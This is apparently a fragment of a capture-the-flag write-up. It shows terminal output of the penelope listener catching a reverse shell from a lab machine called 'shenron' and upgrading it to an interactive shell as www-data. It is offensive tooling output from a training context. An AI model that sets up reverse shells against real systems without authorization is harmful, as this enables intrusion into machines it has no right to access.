
```bash
┌──(cab00s3㉿proxmox-kali-ctf)-[/usr/share/webshells/php]
└─$ python3 ~/Github/penelope/penelope.py 2339
[+] Listening for reverse shells on 0.0.0.0 2339 
➤   Show Payloads (p)  Main Menu (m)  Clear (Ctrl-L)  Quit (q/Ctrl-C)
[+] Got reverse shell from  {shenron_ip}  - Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/cab00s3/.penelope/{shenron_ip}/{shenron_ip}.log 
www-data@shenron:/$ whoami
www-data
```